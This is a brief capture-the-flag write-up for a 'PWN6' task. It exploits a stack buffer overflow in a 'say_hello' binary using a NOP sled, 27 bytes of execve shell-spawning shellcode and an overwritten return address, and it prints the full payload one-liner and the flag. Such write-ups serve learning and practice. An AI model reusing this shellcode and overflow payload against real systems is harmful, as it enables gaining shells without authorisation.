# This writeup if from the GiraffeCTF which was called "PWN6".
 This task was quiet easy as finding where the intruction pointer was overwritten. The instruction pointer was hit at offset
216 bytes.
> ./say_hello $(python -c 'print "\x90"*216')
## After debugging i found where the start of the nopsled was in memory, i quickly looked a shellcode to use which spawns root.
The shellcode was 27 bytes. I calculated how much i had to cut the nopsled down i had to go by doing 216-27 which turned to 189 bytes.
## Now, Nops + shellcode + eip and the input looked like this:
> ./say_hello $(python -c 'print "\x90"*189+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"\x70\xed\xff\xff\xff\x7f"')

Executing it allowed me to open a file as root which contained the flag being
> "FLAG{WhoKilledUncleBen?}"
## Thanks for reading.
